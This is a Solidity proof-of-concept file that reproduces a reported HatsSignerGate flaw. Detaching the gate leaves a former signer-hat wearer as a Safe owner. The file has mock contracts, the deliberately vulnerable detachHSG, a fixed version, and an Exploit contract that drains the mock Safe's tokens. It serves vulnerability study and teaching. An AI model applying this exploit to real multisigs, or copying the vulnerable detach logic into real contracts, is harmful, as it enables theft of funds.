// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hats Protocol HatsSignerGate — detachHSG leaves a former hat wearer as a
    Safe owner (Sherlock, bughuntoor, H-1, November 2024).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: detachHSG removes the gate as guard and as module and does not
    unregister Safe owners who no longer wear the signer hat. After the gate
    is gone, that address can execute a Safe transfer. The guard is reduced
    to the hat check the real checkTransaction enforces. detachHSG is verbatim.
    Vulnerable line preserved below (@> VULN). */

interface ISafe {
    function execRemoveHSGAsGuard() external;
    function execDisableHSGAsOnlyModule() external;
}

interface IHats {
    function isWearerOfHat(address wearer, uint256 hatId) external view returns (bool);
}

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "token: balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockHats is IHats {
    mapping(address => mapping(uint256 => bool)) public wearing;

    function isWearerOfHat(address wearer, uint256 hatId) external view returns (bool) {
        return wearing[wearer][hatId];
    }

    function mint(address who, uint256 hatId) external {
        wearing[who][hatId] = true;
    }

    function move(address from, address to, uint256 hatId) external {
        require(wearing[from][hatId], "Hats: not wearer");
        wearing[from][hatId] = false;
        wearing[to][hatId] = true;
    }
}

contract MiniSafe is ISafe {
    mapping(address => bool) public isOwner;
    address[] internal _owners;
    address public guard;
    address public module;

    function addOwner(address who) external {
        require(!isOwner[who], "Safe: already owner");
        isOwner[who] = true;
        _owners.push(who);
    }

    function getOwners() external view returns (address[] memory) {
        return _owners;
    }

    function removeOwner(address who) external {
        require(msg.sender == module, "Safe: not module");
        require(isOwner[who], "Safe: not owner");
        isOwner[who] = false;
        for (uint256 i; i < _owners.length; ++i) {
            if (_owners[i] == who) {
                _owners[i] = _owners[_owners.length - 1];
                _owners.pop();
                break;
            }
        }
    }

    function attach(address hsg) external {
        guard = hsg;
        module = hsg;
    }

    function execRemoveHSGAsGuard() external {
        require(msg.sender == module, "Safe: not hsg");
        guard = address(0);
    }

    function execDisableHSGAsOnlyModule() external {
        require(msg.sender == module, "Safe: not hsg");
        module = address(0);
    }

    function execTransaction(address to, bytes calldata data) external {
        require(isOwner[msg.sender], "Safe: not owner");
        if (guard != address(0)) {
            HatsSignerGate(guard).checkTransaction(msg.sender);
        }
        (bool ok,) = to.call(data);
        require(ok, "Safe: call failed");
    }
}

contract HatsSignerGate {
    IHats public HATS;
    ISafe public safe;
    uint256 public ownerHat;
    uint256 public signerHat;
    bool public locked;

    error NotOwnerHatWearer();
    error Locked();

    event Detached();

    constructor(IHats hats, ISafe _safe, uint256 _ownerHat, uint256 _signerHat) {
        HATS = hats;
        safe = _safe;
        ownerHat = _ownerHat;
        signerHat = _signerHat;
    }

    function _checkOwner() internal view {
        if (!HATS.isWearerOfHat(msg.sender, ownerHat)) revert NotOwnerHatWearer();
    }

    function _checkUnlocked() internal view {
        if (locked) revert Locked();
    }

    function checkTransaction(address signer) external view {
        require(msg.sender == address(safe), "HSG: not safe");
        require(HATS.isWearerOfHat(signer, signerHat), "HSG: signer does not wear hat");
    }

    function detachHSG() public {
        _checkUnlocked();
        _checkOwner();
        ISafe s = safe; // save SLOAD

        // first remove as guard, then as module
        // @> VULN: owners who no longer wear the signer hat stay owners of the Safe
        s.execRemoveHSGAsGuard();
        s.execDisableHSGAsOnlyModule();
        emit Detached();
    }
}

contract HatsSignerGateFixed {
    IHats public HATS;
    MiniSafe public safe;
    uint256 public ownerHat;
    uint256 public signerHat;
    bool public locked;

    event Detached();

    constructor(IHats hats, MiniSafe _safe, uint256 _ownerHat, uint256 _signerHat) {
        HATS = hats;
        safe = _safe;
        ownerHat = _ownerHat;
        signerHat = _signerHat;
    }

    function detachHSG() public {
        require(!locked, "locked");
        require(HATS.isWearerOfHat(msg.sender, ownerHat), "not owner hat");
        address[] memory owners = safe.getOwners();
        for (uint256 i; i < owners.length; ++i) {
            if (!HATS.isWearerOfHat(owners[i], signerHat)) {
                safe.removeOwner(owners[i]);
            }
        }
        safe.execRemoveHSGAsGuard();
        safe.execDisableHSGAsOnlyModule();
        emit Detached();
    }
}

contract Former {
    MiniSafe public safe;
    MockToken public token;

    constructor(MiniSafe _safe, MockToken _token) {
        safe = _safe;
        token = _token;
    }

    function pull() external {
        safe.execTransaction(
            address(token),
            abi.encodeWithSelector(token.transfer.selector, address(this), 1000 ether)
        );
    }
}

contract Exploit {
    uint256 public constant OWNER_HAT = 1;
    uint256 public constant SIGNER_HAT = 2;
    address public constant NEW_WEARER = address(0x2222);

    MockToken public token;
    MockHats public hats;
    MiniSafe public safe;
    HatsSignerGate public hsg;
    Former public former;
    bool public guardBlocked;

    constructor() {
        token = new MockToken();
        hats = new MockHats();
        safe = new MiniSafe();
        hsg = new HatsSignerGate(hats, ISafe(address(safe)), OWNER_HAT, SIGNER_HAT);
        former = new Former(safe, token);
        safe.attach(address(hsg));
        safe.addOwner(address(former));
        hats.mint(address(this), OWNER_HAT);
        hats.mint(address(former), SIGNER_HAT);
        token.mint(address(safe), 1000 ether);
    }

    function run() external {
        hats.move(address(former), NEW_WEARER, SIGNER_HAT);
        require(!hats.isWearerOfHat(address(former), SIGNER_HAT), "still wears the hat");
        require(safe.isOwner(address(former)), "former is not an owner");

        (bool blocked,) = address(former).call(abi.encodeWithSelector(former.pull.selector));
        require(!blocked, "guard did not block the former owner");
        guardBlocked = true;

        hsg.detachHSG();
        require(safe.guard() == address(0), "guard still set");
        require(safe.isOwner(address(former)), "detach removed the former owner");

        former.pull();
        require(token.balanceOf(address(former)) == 1000 ether, "former did not receive 1000");
        require(token.balanceOf(address(safe)) == 0, "safe still holds tokens");
    }
}
